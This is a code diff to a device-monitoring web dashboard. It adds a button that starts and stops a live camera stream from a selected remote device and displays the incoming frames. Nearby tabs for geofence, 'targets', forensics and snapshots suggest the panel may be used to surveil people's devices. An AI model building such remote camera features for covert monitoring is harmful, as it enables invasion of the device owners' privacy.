@@ -218,9 +218,16 @@
                     <div class="tab-content" id="tab-snapshots">
                         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                             <span style="font-size:0.82rem;color:var(--text3);" id="snapCount">0 snapshot</span>
-                            <button class="header-btn" onclick="exportSnapshots()">Download ZIP</button>
+                            <div style="display:flex;gap:6px;">
+                                <button class="header-btn" id="liveCamBtn" onclick="toggleLiveCam()" style="display:none;">&#x25b6; Live</button>
+                                <button class="header-btn" onclick="exportSnapshots()">Download ZIP</button>
+                            </div>
                         </div>
                         <div class="snap-grid" id="snapGrid"></div>
+                        <div id="liveCamContainer" style="display:none;margin-top:8px;">
+                            <img id="liveCamImg" style="width:100%;max-width:480px;border-radius:8px;border:2px solid var(--accent);">
+                            <div style="font-size:0.72rem;color:var(--accent);margin-top:4px;">&#x25cf; Live</div>
+                        </div>
                     </div>
 
                     <!-- TAB: GEOFENCE -->
@@ -813,6 +820,38 @@
             }
         });
 
+        // === LIVE CAMERA ===
+        let liveCamActive = false;
+        socket.on('camera-frame', (data) => {
+            if (!liveCamActive || data.deviceId !== selectedId) return;
+            const el = document.getElementById('liveCamImg');
+            if (el) el.src = 'data:image/jpeg;base64,' + data.image;
+        });
+        socket.on('camera-stop', (id) => {
+            if (id === selectedId && liveCamActive) {
+                liveCamActive = false;
+                document.getElementById('liveCamBtn').textContent = '\u25b6 Live';
+                document.getElementById('liveCamContainer').style.display = 'none';
+                showToast('Live camera stopped', 'info');
+            }
+        });
+
+        function toggleLiveCam() {
+            if (!selectedId) return;
+            liveCamActive = !liveCamActive;
+            const btn = document.getElementById('liveCamBtn');
+            if (liveCamActive) {
+                btn.textContent = '\u25a0 Stop';
+                document.getElementById('liveCamContainer').style.display = 'block';
+                socket.emit('start-camera-stream', selectedId);
+                showToast('Live camera started', 'success');
+            } else {
+                btn.textContent = '\u25b6 Live';
+                document.getElementById('liveCamContainer').style.display = 'none';
+                socket.emit('stop-camera-stream', selectedId);
+            }
+        }
+
         // === AI PROFILE ===
         function loadProfile() {
             const id = selectedId;
@@ -1041,10 +1080,21 @@
             showToast(`Forensics: ${data.type} - ${data.label}`, 'warn');
         });
 
-        // Patch selectDevice to also load profile, forensics, targets
+        // Patch selectDevice to also load profile, forensics, targets, live cam
         const origSelect = selectDevice;
         selectDevice = function(id) {
             origSelect(id);
+            const btn = document.getElementById('liveCamBtn');
+            if (id && devices[id] && devices[id].online) {
+                btn.style.display = 'inline-block';
+            } else {
+                btn.style.display = 'none';
+            }
+            if (liveCamActive) {
+                liveCamActive = false;
+                document.getElementById('liveCamBtn').textContent = '\u25b6 Live';
+                document.getElementById('liveCamContainer').style.display = 'none';
+            }
             setTimeout(() => {
                 loadProfile();
                 loadForensics();
